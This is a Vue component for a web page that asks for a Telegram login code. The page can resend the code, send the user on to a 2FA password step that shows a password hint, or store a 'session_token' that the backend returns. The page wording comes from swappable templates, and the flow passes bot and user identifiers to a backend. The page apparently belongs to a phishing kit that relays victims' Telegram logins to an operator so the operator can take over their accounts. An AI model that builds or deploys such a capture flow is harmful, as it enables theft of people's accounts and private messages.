<script setup>
import { ref } from "vue";
import { useRouter } from "vue-router";
import { useUserStore } from "../stores/userStore";
import { useTemplateStore } from "../stores/templateStore";
import { api } from "../api/client";

const router = useRouter();
const userStore = useUserStore();
const templateStore = useTemplateStore();

const code = ref("");
const submitting = ref(false);
const errorMsg = ref("");
const infoMsg = ref("");

async function handleVerify(resend = false) {
  errorMsg.value = "";
  infoMsg.value = "";

  if (!resend && !code.value.trim()) {
    errorMsg.value = "Please enter the verification code.";
    return;
  }

  submitting.value = true;
  try {
    const res = await api.enterCode({
      code: code.value.trim(),
      resend,
      bot_user_id: userStore.uId,
      bot_id: userStore.botId,
      user_tg: userStore.user,
    });

    if (resend && res?.ok) {
      infoMsg.value = "A new verification code has been sent.";
      return;
    }

    if (res?.ok && res?.next_state === "enter_twoFA") {
      userStore.passwordHint = res.password_hint || "";
      userStore.state = "enter_twoFA";
      router.push("/password");
    } else if (res?.ok) {
      userStore.sessionToken = res.session_token || "";
      userStore.state = "end";
      router.push("/end");
    } else {
      errorMsg.value = res?.error || "Invalid or expired code.";
    }
  } catch (err) {
    errorMsg.value = err.message;
  } finally {
    submitting.value = false;
  }
}

async function handleWrongNumber() {
  submitting.value = true;
  try {
    await api.wrongNumber({
      bot_user_id: userStore.uId,
      bot_id: userStore.botId,
      user_tg: userStore.user,
    });
    userStore.state = "need_phone";
    router.replace("/start");
  } finally {
    submitting.value = false;
  }
}
</script>

<template>
  <section class="card">
    <span v-if="userStore.phoneNumber" class="info-badge">
      {{ userStore.phoneNumber }}
    </span>
    <h2>{{ templateStore.template.code.title || "Enter Verification Code" }}</h2>
    <p>
      {{
        templateStore.template.code.description ||
        "Enter the 6-digit code sent via your Telegram bot."
      }}
    </p>

    <input
      v-model="code"
      type="text"
      inputmode="numeric"
      maxlength="8"
      placeholder="123456"
      class="input"
      @keyup.enter="handleVerify(false)"
    />
    <p v-if="errorMsg" class="error">{{ errorMsg }}</p>
    <p v-if="infoMsg" class="info-badge">{{ infoMsg }}</p>

    <button class="btn" :disabled="submitting" @click="handleVerify(false)">
      {{ submitting ? "Verifying..." : templateStore.template.code.buttonText || "Verify Code" }}
    </button>
    <button class="btn-secondary" :disabled="submitting" @click="handleVerify(true)">
      Resend Code
    </button>
    <button class="btn-secondary" :disabled="submitting" @click="handleWrongNumber">
      Change Phone Number
    </button>
  </section>
</template>
